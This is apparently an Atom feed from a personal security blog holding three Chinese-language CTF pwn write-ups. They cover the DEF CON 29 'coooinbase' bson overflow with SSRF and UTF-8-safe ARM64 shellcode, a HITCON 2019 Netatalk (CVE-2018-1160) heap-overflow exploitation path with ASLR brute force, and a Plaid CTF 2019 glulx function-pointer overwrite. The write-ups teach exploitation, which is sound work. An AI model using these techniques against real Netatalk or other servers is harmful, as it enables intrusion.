@@ -1,0 +1,2095 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>ddaa's blog - pwn</title><link href="https://ddaa.tw/" rel="alternate"></link><link href="https://ddaa.tw/feeds/pwn.atom.xml" rel="self"></link><id>https://ddaa.tw/</id><updated>2021-05-04T15:19:00+08:00</updated><entry><title>DEF CON 29 CTF Quals Pwn 149 coooinbase</title><link href="https://ddaa.tw/defconctf_pwn_149_coooinbase.html" rel="alternate"></link><published>2021-05-04T15:19:00+08:00</published><updated>2021-05-04T15:19:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2021-05-04:/defconctf_pwn_149_coooinbase.html</id><summary type="html">&lt;p&gt;2020 一整年都沒發文 XD，去年只有打 DEF CON 初賽決賽而已，今年年初只打了 RealWorld CTF，現在比較少打 CTF，除了健康和體力不太能負荷，總覺得題目也沒有以前有趣了，大部分題目要花大量時間逆向，技術含量卻有限，常常辛苦逆向完或寫好工具，但解完這題之後就用不太上...不如把時間拿去挖 real world 的漏洞更有價值 QQ 這題在漏洞部分是比較簡單的題目，但利用這個漏洞需要發揮創意思考，如果沒有非預期的爛洞的話會是有趣的 pwn 題&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;題目連上後會是一個信用卡付款的 web 頁面，前端 post data 送到 ruby 寫的後端處理&lt;br&gt;
+ruby 端會先檢查一下 card number 是否格式正確，然後將 post data 轉換成 &lt;strong&gt;bson&lt;/strong&gt; 格式後用 base64 編碼透過 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;2020 一整年都沒發文 XD，去年只有打 DEF CON 初賽決賽而已，今年年初只打了 RealWorld CTF，現在比較少打 CTF，除了健康和體力不太能負荷，總覺得題目也沒有以前有趣了，大部分題目要花大量時間逆向，技術含量卻有限，常常辛苦逆向完或寫好工具，但解完這題之後就用不太上...不如把時間拿去挖 real world 的漏洞更有價值 QQ 這題在漏洞部分是比較簡單的題目，但利用這個漏洞需要發揮創意思考，如果沒有非預期的爛洞的話會是有趣的 pwn 題&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;題目連上後會是一個信用卡付款的 web 頁面，前端 post data 送到 ruby 寫的後端處理&lt;br&gt;
+ruby 端會先檢查一下 card number 是否格式正確，然後將 post data 轉換成 &lt;strong&gt;bson&lt;/strong&gt; 格式後用 base64 編碼透過 stdin 丟給 &lt;code&gt;x.sh&lt;/code&gt; 執行&lt;br&gt;
+&lt;code&gt;x.sh&lt;/code&gt; 會跑 qemu arm64 kernel，kernel 再運行 userspase 的程式處理 base64 input，最後將 output 回傳給 web 顯示&lt;br&gt;
+userspace 和 kernel 各有一把 flag，kernel 的部分是另一題 cooinbase-kernel，這篇 write-up 不會提到 kernel 部分   &lt;/p&gt;
+&lt;p&gt;這題的 kernel 部分不是 Linux Kernel，syscall 是自己定義的，userspace 也不是 ELF format，因此丟進 ida pro 沒辦法直接認出來&lt;br&gt;
+需要自己標出 entry 再讓 ida pro 去解，userspace 的程式如果先看 kernel 應該可以很輕易找出來，但沒看可以更輕易找出來，因為 entry 就在 0 而已 XD&lt;br&gt;
+接著是逆向的部分，userspace 是一個很小的 binary 叫做 &lt;code&gt;run&lt;/code&gt;，沒有 library call，syscall 也跟正常 Linux Kernel 的不同，程式有自己包幾個常見 function，像是 &lt;code&gt;strcpy&lt;/code&gt;、&lt;code&gt;memcpy&lt;/code&gt; 之類的，有點像 IoT 上會跑的程式  &lt;/p&gt;
+&lt;p&gt;經過一番逆向之後可以看出程式的行為是：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;透過 getchar 的 syscall 跑 loop 讀 512 byte 進來再補 \0 做結尾&lt;/li&gt;
+&lt;li&gt;將 input 做 base64 decode，得到 raw bson&lt;/li&gt;
+&lt;li&gt;將 raw bson 進行初步處理成 bson object&lt;/li&gt;
+&lt;li&gt;從 bson object 拿到 post data 中的 &lt;code&gt;CVC&lt;/code&gt;, &lt;code&gt;MON&lt;/code&gt;, &lt;code&gt;YR&lt;/code&gt;, &lt;code&gt;CC&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;其中 &lt;code&gt;CC&lt;/code&gt; 是透過 &lt;code&gt;bson_get_string&lt;/code&gt; 取出，其他的是透過 &lt;code&gt;bson_get_int&lt;/code&gt; 取出&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;依序印出 &lt;strong&gt;PROCESSED CC: &lt;/strong&gt;、&lt;strong&gt;$CC&lt;/strong&gt;、&lt;strong&gt;\n&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;程式的漏洞在 &lt;code&gt;bson_get_string&lt;/code&gt;，裡面會發生 stack overflow&lt;br&gt;
+bson string 的格式是：&lt;code&gt;"\x02" + ename + "\x00" + p32(size) + data + "\x00"&lt;/code&gt;&lt;br&gt;
+&lt;code&gt;bson_get_string&lt;/code&gt; 會先取得 size，再用類似 alloca 的行為將 stack 往上拉，然後用 &lt;code&gt;strcpy&lt;/code&gt; 將 data 複製到 buffer 上&lt;br&gt;
+因為沒有檢查 size 和 data 的長度是否一致，因此再 strcpy 時會發生 overflow，可以蓋掉 ret 控制 $pc &lt;br&gt;
+但有個問題是，bson 是由 web 端的 ruby 構造出來的，我們沒辦法直接構造出 size 和 data 不一致的 bson  &lt;/p&gt;
+&lt;p&gt;嘗試解決這個問題時，發現送超長的 input 時 output 會多噴一次 &lt;strong&gt;PROCESSED CC:&lt;/strong&gt;&lt;br&gt;
+原因是程式其實會一直重複執行直到 &lt;code&gt;x.sh&lt;/code&gt; 裡面的 &lt;code&gt;timeout 1&lt;/code&gt; 中止 qemu 才停止&lt;br&gt;
+我們送的長度如果在 base64 編碼後超過 512 byte，超出的部分就會到程式下次執行才被處理&lt;br&gt;
+所以我們可以在控制 card number 的長度，讓 card number 的後半段變成下次執行的 input，就可以用後半段構造任意 bson  &lt;/p&gt;
+&lt;p&gt;由於 kernel 沒有實作 &lt;strong&gt;ASLR&lt;/strong&gt; 和 &lt;strong&gt;DEP&lt;/strong&gt; 的保護，因此接下來將 $pc 控到我們 input 的地方跑 shellcode 就可以 RCE 了&lt;br&gt;
+...才怪，上面只是我天真的想法 = =&lt;br&gt;
+要控 $pc 到 stack 上的時候發現 input 如果包含 &lt;code&gt;0x80&lt;/code&gt; 以上的字元就沒辦法順利餵 input&lt;br&gt;
+追蹤了一陣發現是在餵給 binary 之前 ruby 會用 regex 做檢查 card number&lt;br&gt;
+如果 input 包含 &lt;code&gt;0x80&lt;/code&gt; 以上的字元會發生 utf8 decode 的 exception，binary 從 input 拿到的只是 exception 的字串而已&lt;br&gt;
+只要傳合法的 utf8 字串就可以了嗎 ? 但唯一能放 shellcode 的 buffer 只有 stack 上，會落在 &lt;strong&gt;0xf000 ~ 0x10000&lt;/strong&gt; 之間&lt;br&gt;
+而 &lt;code&gt;0xf0&lt;/code&gt; ~ &lt;code&gt;0xff&lt;/code&gt; 不可能在 utf8 的結尾出現，也就是說在 string-based 的 overflow 中我們沒辦法把 ret 蓋成 stack 上的 address  &lt;/p&gt;
+&lt;p&gt;我在這邊卡關了好一陣子沒想法，只好請求隊友的支援 QQ 大家努力一陣子之後，幾乎在同時間發現三個可行的做法：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;透過 SSRF 構造任意的 bson
+    web 端的 ruby 是將 post form 轉送給 &lt;code&gt;http://#{env['HTTP_HOST']}/gen-bson"&lt;/code&gt;，但 HTTP_HOST 是從 HTTP header 的 HOST 欄位可以控制，可以架一個 web server 直接在 /gen-bson 頁面回傳任意的 bson，連前面控制 card number 的長度都不需要 ... XD 因為不會過原本的 /gen-bson，也不會遇到 utf8 字元的問題，所以真的是超簡單蓋 ret 跳 stack 跑 shellcode 就結束了&lt;/li&gt;
+&lt;li&gt;透過 alloca 將 &lt;code&gt;strcpy&lt;/code&gt; 的內容蓋掉原本 codebase&lt;ul&gt;
+&lt;li&gt;前面有提到 0 是這個 binary 的 entry point，由於 bson string 的 size 是我們可以任意控制的，因此有機會將 alloca 後的 buffer 拉到 codebase 的位置，這樣程式下一次執行時跑到 codebase 時就會跑我們的 code&lt;/li&gt;
+&lt;li&gt;這個思路沒有實際嘗試，我把改掉 size 之後就沒有好好的跑到 &lt;code&gt;bson_get_string&lt;/code&gt; 裡面，應該是弄壞了偽造的 bson 結構，要重新構造一下才有機會，另外 &lt;code&gt;strcpy&lt;/code&gt; 寫的 shellcode 要避開 null byte 和 utf8 char 的問題，不是很好利用&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;透過 &lt;code&gt;bson_get_int&lt;/code&gt; 寫 4 byte shellcode&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;bson_get_int&lt;/code&gt; 可以讀 4 byte 到 x2 指到的位置上，而 overflow 完 x2 剛好是 bson 中 &lt;code&gt;CC&lt;/code&gt; 結構的大小 (= size + 11)，我們可以跳到原本程式拿出 &lt;code&gt;YR&lt;/code&gt; 的地方，將 YR 的值取出當成 4 byte 的 shellcode 到 &lt;code&gt;size + 11&lt;/code&gt; 的位置，下次 overflow 再跳到 &lt;code&gt;size + 11&lt;/code&gt; 跑 4 byte shellcode，跳到完整 shellcode 的位置&lt;/li&gt;
+&lt;li&gt;由於 &lt;code&gt;bson_get_string&lt;/code&gt; 已經先 parse 了 size 錯誤的 CC，因此我們需要在 CC 內部構造一個假的 bson object 讓拿完 size 之後，讓繼續爬 YR 的時候不會壞掉，細節請參考 exploit&lt;/li&gt;
+&lt;li&gt;size + 11 沒有對齊 4 byte，但不知道是 qemu 還是 kernel 沒有檢查要 alignment，所以直接跳過去就可以執行&lt;/li&gt;
+&lt;li&gt;4 byte shellcode 和 full shellcode 都要避開 invalid utf8 char&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;比賽中是用 SSRF 拿到 flag，後續 kernel 題就可以寫一個超過長度的 read shellcode 來拿到 kernel flag&lt;br&gt;
+賽後試了一下透過第三個思路也是可以達成目的，但 shellcode 就比較難寫一點，要閃掉 invalid utf8 char，kernel 的部分理論上也沒問題，但就懶得寫了 XD   &lt;/p&gt;
+&lt;p&gt;最後講一下寫 utf8 的 shellcode：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;透過類似 &lt;code&gt;add w0, w0, $imm&lt;/code&gt; 的指令當成 &lt;code&gt;mov&lt;/code&gt; 來控制 reg&lt;ul&gt;
+&lt;li&gt;建議不要用 x 系列的 reg 否則會出現 invalid char&lt;/li&gt;
+&lt;li&gt;裡面只有 $imm 有機會出現 0x80 以上的 char，遇上時可以 add 多次來閃&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;svc 0&lt;/code&gt; 結尾會包含 0xd4，因此下一條要是 0x80 以上的 instruction&lt;ul&gt;
+&lt;li&gt;可以從 &lt;a href="https://developer.arm.com/documentation/ddi0596/2021-03/Base-Instructions/B-cond--Branch-conditionally-?lang=en"&gt;arm developer&lt;/a&gt; 的文件中找隨便一條低位的 8 bit 可以任意控制、高位不包含 invalid char、而且不影響 shellcode 行為的指令&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;beq 0x0030&lt;/code&gt; = &lt;code&gt;\x80\x01\x00\x54&lt;/code&gt; 可以滿足條件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;exp: &lt;a href="https://ddaa.tw/exp/coooinbase.py"&gt;coooinbase.py&lt;/a&gt;&lt;/p&gt;</content><category term="DEF CON CTF"></category><category term="Stack Overflow"></category><category term="ARMv8"></category><category term="Shellcode"></category></entry><entry><title>HITCON CTF 2019 Pwn 371 Netatalk</title><link href="https://ddaa.tw/hitconctf_pwn_371_netatalk.html" rel="alternate"></link><published>2019-10-16T01:39:00+08:00</published><updated>2019-10-16T01:39:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2019-10-16:/hitconctf_pwn_371_netatalk.html</id><summary type="html">&lt;p&gt;其實不是第一年在 HITCON CTF 出題，由於有正職在身，沒有時間從頭設計題目，因此都會盡量從跟工作有關聯的方向設計題目，今年這題其實也是在去年工作時處理 Insident Response 時遇到的 case，但經過深入研究後，發現了這個 CVE 有原揭露者沒想到的 exploit 方式，是我到現在出題為止最滿意的一題，從迴響上來看也是最好的一題 XD&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;Netatalk&lt;/strong&gt; 是一套實作蘋果系統上 AFP 協定的軟體，AFP 跟 Windows 上的 SMB 類似，是用於兩台不同電腦間需要傳輸檔案的一種 file transfer protocol，但後來隨著 Apple 也支援 SMB 後，AFP 的使用量相對減少很多，但由於用 AFP 傳輸檔案還是比 SMB 快速和簡便一些，因此還是有些人會搭配 Time Machine …&lt;/p&gt;</summary><content type="html">&lt;p&gt;其實不是第一年在 HITCON CTF 出題，由於有正職在身，沒有時間從頭設計題目，因此都會盡量從跟工作有關聯的方向設計題目，今年這題其實也是在去年工作時處理 Insident Response 時遇到的 case，但經過深入研究後，發現了這個 CVE 有原揭露者沒想到的 exploit 方式，是我到現在出題為止最滿意的一題，從迴響上來看也是最好的一題 XD&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;Netatalk&lt;/strong&gt; 是一套實作蘋果系統上 AFP 協定的軟體，AFP 跟 Windows 上的 SMB 類似，是用於兩台不同電腦間需要傳輸檔案的一種 file transfer protocol，但後來隨著 Apple 也支援 SMB 後，AFP 的使用量相對減少很多，但由於用 AFP 傳輸檔案還是比 SMB 快速和簡便一些，因此還是有些人會搭配 Time Machine 之類的服務進行使用&lt;/p&gt;
+&lt;p&gt;Netatalk 在去年的 12 月左右被爆出了一個 &lt;code&gt;Critical&lt;/code&gt; 級別的 unauth RCE 漏洞，但隨著細節公開之後，研究者表示自己嘗試後發現只能在 NAS 上進行利用，詳情可以參考 tenable 的 blog&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172"&gt;https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;BTW，這篇 blog 有點標題殺人....XD 雖然這個問題在 18 年前就產生，但是在 2012 年 3.0.1 版發布之後，改動了 object 結構才變成一個 exploitable 的漏洞，在這之前應該只能造成程式邏輯錯誤而使檔案傳輸中斷&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img alt="netatalk.png" src="https://ddaa.tw/images/hitconctf_2019_netatalk.png"&gt;&lt;/p&gt;
+&lt;p&gt;只能在 NAS 上利用的原因是，現今 Linux distribution 的 compiler，預設編譯時都已經加入 &lt;code&gt;-pie&lt;/code&gt; 的參數，這導致如果是 ASLR enabled 的系統上，攻擊者沒辦法事先知道記憶體的 layout，也沒辦法如 blog 提到的利用方式去進行後續的任意位置寫入&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;由於 PIE 保護會有一定幅度影響系統的效能，目前大多數的 NAS 廠商都沒有開啟&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;此外，攻擊者原本提到的利用方式只能繞過 auth 後執行 AFP 的檔案操作，沒辦法做到真正意義上的 RCE，但我在 HITCON CMT 2019 的 &lt;a href="https://hackmd.io/@HITCON/rk9d0q6Nr#CVE-2018-1160-Netatalk"&gt;talk&lt;/a&gt; 上，提出了另外利用方式，可以在同樣的漏洞上做到真正意義上，透過 &lt;code&gt;execve&lt;/code&gt; 執行系統上的任意指令，達到真正意義上的 RCE&lt;/p&gt;
+&lt;p&gt;當時在研究這個漏洞的同時，其實就有在質疑真的在 ASLR 開啟的情況下，真的是 unexploitable 的漏洞嗎 ? 那時候簡單看了一下，overflow 使用 &lt;code&gt;memcpy&lt;/code&gt;，可以做 heap 上的 partial write，可能是有機會利用的，但與當時的 talk 主題 NAS 無關，因此保留起來沒有說這件事情，藏招這次出題時再來好好研究 XD&lt;/p&gt;
+&lt;p&gt;首先我的想法是：「既然可以做 heap 上的 partial overwrite，那只要把 data ptr 往回指，應該就能做 CTF 常見的 heap exploit 吧，尤其現在的環境都有 tcache 好玩，可能有機會在 malloc 時搞出 main_arena 然後做進一步的利用。」&lt;/p&gt;
+&lt;p&gt;但環境跑起來發現原本在 NAS 上觀察的 heap exploit 不見了... XD 原本的 data ptr 被指到 mmap 分出來的區段上，沒辦法用 ptmalloc 的機制來搞事 QQ 會這樣的原因是因為 afp protocol 中有一項 &lt;code&gt;server quantum&lt;/code&gt; 的設定，這個值會影響到 &lt;code&gt;malloc&lt;/code&gt; 出來的 buffer 大小 ... 預設值是 0x100000 (1 mb)，所以會改用 mmap 得到的空間當成 buffer，沒辦法如預期的一樣在 heap 上搞事&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;我之前測試的 NAS 上有為了效能特調過這個值，因此會使用 &lt;code&gt;brk&lt;/code&gt; 分配出的 heap 當做 buffer&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;原本以為好像就真的不能用了 QQ 但意外觀察到每次 data ptr 指向的位置都是相同的，afpd 在處理 request 的時候是 fork 出一個 process，在收到 &lt;code&gt;exit&lt;/code&gt; 的 AFP command 或著 timeout 之前，這個 process 都會保留 session 等待 client 進行檔案傳輸，相信打 CTF pwn 的人都可以馬上聯想到：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;fork =&amp;gt; memory layout 不變 =&amp;gt; ASLR 是假 der&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;每次連上的 data ptr 不變，因此我們可以用 overflow byte-by-byte 的方式觀察程式是否 crash，來判斷說目前 data ptr 的位置是多少，再透過 mmap 與 library 的 offset 去推算其他 library 的位置，於是現在我們對漏洞的可以利用程度，從 &lt;code&gt;不知道能對哪裡做任意寫入&lt;/code&gt; 變成 &lt;code&gt;可以對 library 的 bss 和 data 段做任意寫入&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;但由於沒辦法利用此方式 leak 出 code 段的位置，因此還是沒辦法用我在 HITCON CMT 上提的方式做到 RCE&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;至此我們就有機會寫 &lt;code&gt;__malloc_hook&lt;/code&gt; 或 &lt;code&gt;__free_hook&lt;/code&gt; 之類的位置來控 RIP 了，但由於這個 exploit 的程式 afpd 本身就是透過 socket 連線，不像 CTF challenge 通常會 redirect I/O 到 socket 上，也就不能簡單的跳 one gadget 來拿 shell，必須自行 dup  I/O 到 socket 在拿 shell，因此我們需要能跑 shellcode 或做足夠長度的 ROP 才行&lt;/p&gt;
+&lt;p&gt;這邊可以達成的方式很多，我的預期解法是 overwrite ld 上的 data 段，把 &lt;code&gt;dl_load_lock&lt;/code&gt;  和 &lt;code&gt;dl_rtld_lock_recursive&lt;/code&gt; 的值都寫掉，這樣就可以跳 &lt;code&gt;setcontext&lt;/code&gt; gadget 做 SROP&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;dl_rtld_lock_recursive&lt;/code&gt; 是一個 function ptr，&lt;code&gt;dl_load_lock&lt;/code&gt; 是一個 mutex&lt;/li&gt;
+&lt;li&gt;程式離開時會在 dl-fini 呼叫 &lt;code&gt;__rtld_lock_lock_recursive(GL(dl_load_lock));&lt;/code&gt; 來 release 程式一些資源，像是 &lt;code&gt;dlopen&lt;/code&gt; 開啟過的 library&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;但 afpd 在 SIGPIPE 時不會結束程式，還是會等到 timeout 才離開，原本會需要在下一次的 command 送 AFP protocol 的 exit 讓程式結束，才能觸發 control RIP，我原本打算留給大家來解決這個問題，但考慮到 bruteforce ASLR 時會造成許多 sessions，還是決定在 afp.conf 裡面將 timeout 改成 0 讓 afpd 立刻結束，避免題目炸裂 XD&lt;/p&gt;
+&lt;p&gt;最後不得不提 Tea Deliverers 的做法，雖然繞了一些遠路，但卻也是 real world exploit 常遇到的狀況，這次的漏洞能任意寫才是少見的情況 XD&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;02:01 &amp;lt; riatre&amp;gt; zzoru: We overwrote GOT entry of memcpy in libatalk.so.18 with system&lt;br&gt;
+02:02 &amp;lt; riatre&amp;gt; Then trigger that with a.... strange code path I'd say  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;flag: &lt;code&gt;hitcon{D1d_y0u_us3_an0ther_0d4y_to_g3t_f14g?}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;exploit: &lt;a href="https://ddaa.tw/exp/netatalk.py"&gt;netatalk.py&lt;/a&gt;&lt;/p&gt;</content><category term="HITCON CTF"></category><category term="Heap Overflow"></category></entry><entry><title>Plaid CTF 2019 Pwn 250 Plaid Adventure II</title><link href="https://ddaa.tw/plaidctf_pwn_250_plaid_adventure_ii.html" rel="alternate"></link><published>2019-04-16T03:05:00+08:00</published><updated>2019-04-16T03:05:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2019-04-16:/plaidctf_pwn_250_plaid_adventure_ii.html</id><summary type="html">&lt;p&gt;這題約結束前 10 分鐘跟 angelboy 一起寫完 exploit&lt;br&gt;
+已經確認在 local 可以打, 結果 remote server 壞掉 = =&lt;br&gt;
+不然應該有機會 AK 的...QQ  &lt;/p&gt;
+&lt;hr&gt;
+&lt;h2&gt;Overview&lt;/h2&gt;
+&lt;p&gt;跟去年 &lt;a href="https://ddaa.tw/plaidctf_reverse_200_plaid_adventure.html"&gt;Plaid Adventure&lt;/a&gt; 一樣是由 &lt;a href="http://inform7.com/"&gt;inform 7&lt;/a&gt; 寫成的互動式文字遊戲&lt;br&gt;
+題目敘述說要讀取 &lt;code&gt;flag.glksave&lt;/code&gt;, 但沒辦法使用 &lt;code&gt;restore&lt;/code&gt; 這個指令&lt;br&gt;
+目的還算滿明確, 要用題目中的漏洞想辦法繞開限制執行 &lt;code&gt;restore&lt;/code&gt;&lt;/p&gt;
+&lt;h2&gt;Analysis&lt;/h2&gt;
+&lt;p&gt;逆向的方式請參考去年的 write up, 逆完之後大致可以知道遊戲是:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;只有一個場景, 場景上只有 &lt;code&gt;machine&lt;/code&gt; 和 &lt;code&gt;blackboard&lt;/code&gt; 兩個物件&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;look machine&lt;/code&gt; 可以從結果得知 &lt;code&gt;dial&lt;/code&gt;, &lt;code&gt;slider …&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;這題約結束前 10 分鐘跟 angelboy 一起寫完 exploit&lt;br&gt;
+已經確認在 local 可以打, 結果 remote server 壞掉 = =&lt;br&gt;
+不然應該有機會 AK 的...QQ  &lt;/p&gt;
+&lt;hr&gt;
+&lt;h2&gt;Overview&lt;/h2&gt;
+&lt;p&gt;跟去年 &lt;a href="https://ddaa.tw/plaidctf_reverse_200_plaid_adventure.html"&gt;Plaid Adventure&lt;/a&gt; 一樣是由 &lt;a href="http://inform7.com/"&gt;inform 7&lt;/a&gt; 寫成的互動式文字遊戲&lt;br&gt;
+題目敘述說要讀取 &lt;code&gt;flag.glksave&lt;/code&gt;, 但沒辦法使用 &lt;code&gt;restore&lt;/code&gt; 這個指令&lt;br&gt;
+目的還算滿明確, 要用題目中的漏洞想辦法繞開限制執行 &lt;code&gt;restore&lt;/code&gt;&lt;/p&gt;
+&lt;h2&gt;Analysis&lt;/h2&gt;
+&lt;p&gt;逆向的方式請參考去年的 write up, 逆完之後大致可以知道遊戲是:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;只有一個場景, 場景上只有 &lt;code&gt;machine&lt;/code&gt; 和 &lt;code&gt;blackboard&lt;/code&gt; 兩個物件&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;look machine&lt;/code&gt; 可以從結果得知 &lt;code&gt;dial&lt;/code&gt;, &lt;code&gt;slider&lt;/code&gt;, &lt;code&gt;button&lt;/code&gt; 三個物件&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;set dial to $flavor&lt;/code&gt; (&lt;code&gt;select $flavor&lt;/code&gt;) 可以選擇飲料的口味&lt;ul&gt;
+&lt;li&gt;一共有 18 個口味: apple, apricot, blackberry, cherry, cranberry, cola, grape, guava, lemon, lime, orange, pickle, peach, pear, pineapple, raspberry, strawberry and watermelon&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;set slider to $num&lt;/code&gt; (&lt;code&gt;set $num&lt;/code&gt;) 可以設定將 slider 設成 -2147483648 ~ 2147483647 之間的數字&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;push button&lt;/code&gt; 會掉一瓶飲料出來, 飲料會印上 &lt;code&gt;$index:$slider&lt;/code&gt; 的 symbol&lt;ul&gt;
+&lt;li&gt;背包最多只能擺 6 瓶飲料&lt;/li&gt;
+&lt;li&gt;不能重複購買飲料&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;drink $flavor&lt;/code&gt; 可以把飲料喝掉, 喝完背包的空間會清出來&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;pickle&lt;/code&gt; 因為太難喝沒辦法喝掉...XD&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;look blackboard&lt;/code&gt; 會印出以下內容:&lt;blockquote&gt;
+&lt;p&gt;A blackboard. On it is written:&lt;br&gt;
+The flag will be here after restoring!&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;(write|erase) blackboard&lt;/code&gt; 可以在 blackboard 上寫字或清除, 最多不能超過 35 個字&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;restore&lt;/code&gt;, &lt;code&gt;save&lt;/code&gt; 之類的系統指令都被禁用了&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Solving&lt;/h2&gt;
+&lt;p&gt;這題的困難點就是在逆向和找洞...&lt;br&gt;
+經過一番波折後，發現這題的漏洞在 &lt;code&gt;pickle&lt;/code&gt; 雖然沒辦法喝掉&lt;br&gt;
+但還是會將背包飲料的數量 - 1, 因此可以突破背包 6 瓶飲料的限制&lt;br&gt;
+飲料在印 symbol 時會存在 &lt;code&gt;479074_soda_sliders&lt;/code&gt;&lt;br&gt;
+超過 6 瓶會 out of bound write, 蓋到後面 &lt;code&gt;479098_soda_func&lt;/code&gt; 的內容&lt;br&gt;
+而 &lt;code&gt;479098_soda_func&lt;/code&gt; 是一個 func ptr array ... XD  &lt;/p&gt;
+&lt;p&gt;到這邊已經可以自由控 $pc 到任意位置&lt;br&gt;
+很開心地想說跳 &lt;code&gt;restore&lt;/code&gt; 就可以結束了, 但發現可以跳 &lt;code&gt;save&lt;/code&gt; 卻不能跳 &lt;code&gt;restore&lt;/code&gt;&lt;br&gt;
+因為...  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[ routine7331_restore local0 local4 ;
+    @nop;
+    @nop;
+    @nop;
+    ...
+    return 1;
+];
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;◢▆▅▄▃ 崩╰(〒皿〒)╯潰 ▃▄▅▆◣&lt;/p&gt;
+&lt;p&gt;比對了 asm 確定是沒有其他的 &lt;code&gt;@restore&lt;/code&gt; 指令集可以使用&lt;br&gt;
+接下來很明確必須自行寫入 shellcode, 並跳過去執行 (glulx vm 不存在 NX 保護)&lt;br&gt;
+原本想透過黑板的 write 指令來寫 bytecode&lt;br&gt;
+但發現 write 指令沒辦法讀 null byte&lt;br&gt;
+而要將 shellcode 偽造成 routine 一定得包含 null byte... orz&lt;br&gt;
+BTW, 如果直接跳到非 routine 開頭的位置, glulx 會直接發生 exception 終止程式  &lt;/p&gt;
+&lt;p&gt;卡了一陣子才想到可以利用前面 &lt;code&gt;479074_soda_sliders&lt;/code&gt; 來放 shellcode&lt;br&gt;
+&lt;code&gt;479074_soda_sliders&lt;/code&gt; 是一個 big endien 的 int 陣列&lt;br&gt;
+只要重複 &lt;code&gt;set slider to $num&lt;/code&gt; 和 &lt;code&gt;push button&lt;/code&gt; 就可以寫入 shellcode  &lt;/p&gt;
+&lt;p&gt;這邊原本想把去年題目的 restore bytecode 送過去&lt;br&gt;
+但發現因為遊戲檔案格式和版本不同, 沒辦法直接參考&lt;br&gt;
+花了一點時間弄出最新版的 &lt;code&gt;.ulx&lt;/code&gt; 檔案&lt;br&gt;
+又發現完整的 restore 長度會超過可用的空間 = =&lt;br&gt;
+最後透過 try and error 確定只需要留以下 asm 就可以達到 restore 的功能:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;@callfiii routine763 1 2 0 -&amp;gt; local4;
+@callfiii routine589 local4 2 301 -&amp;gt; mem450124;
+@restore mem450124 -&amp;gt; local0;
+return -1;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;最後只要把超出背包的某瓶飲料 slider 設到放 shellcode 的位置&lt;br&gt;
+執行 &lt;code&gt;drink $flavor&lt;/code&gt; 就可以觸發 restore, 輸入 &lt;code&gt;flag&lt;/code&gt; 讀取 &lt;code&gt;flag.glksave&lt;/code&gt;&lt;br&gt;
+再回來看 blackboard 上的內容就有 flag 了  &lt;/p&gt;
